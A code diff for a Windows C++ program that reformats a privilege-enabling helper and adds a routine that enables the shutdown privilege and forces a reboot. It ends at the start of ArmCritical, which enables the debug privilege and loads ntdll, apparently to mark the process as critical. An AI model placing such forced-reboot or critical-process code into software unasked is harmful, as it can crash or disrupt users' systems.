@@ -40,17 +40,34 @@ static void SetRed() {
 
 static BOOL EnablePrivilege(LPCSTR name) {
     HANDLE hTok = NULL;
-    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTok))
+    if (!OpenProcessToken(GetCurrentProcess(),
+        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTok))
         return FALSE;
-    TOKEN_PRIVILEGES tp;
+
+    TOKEN_PRIVILEGES tp = {};
     tp.PrivilegeCount = 1;
     tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-    if (!LookupPrivilegeValueA(NULL, name, &tp.Privileges[0].Luid)) { CloseHandle(hTok); return FALSE; }
+
+    if (!LookupPrivilegeValueA(NULL, name, &tp.Privileges[0].Luid)) {
+        CloseHandle(hTok);
+        return FALSE;
+    }
+
     BOOL ok = AdjustTokenPrivileges(hTok, FALSE, &tp, 0, NULL, NULL);
     CloseHandle(hTok);
     return ok;
 }
 
+static void TriggerReboot() {
+    if (!EnablePrivilege("SeShutdownPrivilege")) {
+        std::cerr << "Failed to enable privilege\n";
+        return;
+    }
+
+    if (!ExitWindowsEx(EWX_REBOOT, 0)) {
+        std::cerr << "ExitWindowsEx failed: " << GetLastError() << "\n";
+    }
+}
 static void ArmCritical() {
     EnablePrivilege("SeDebugPrivilege");
     HMODULE ntdll = GetModuleHandleA("ntdll.dll");
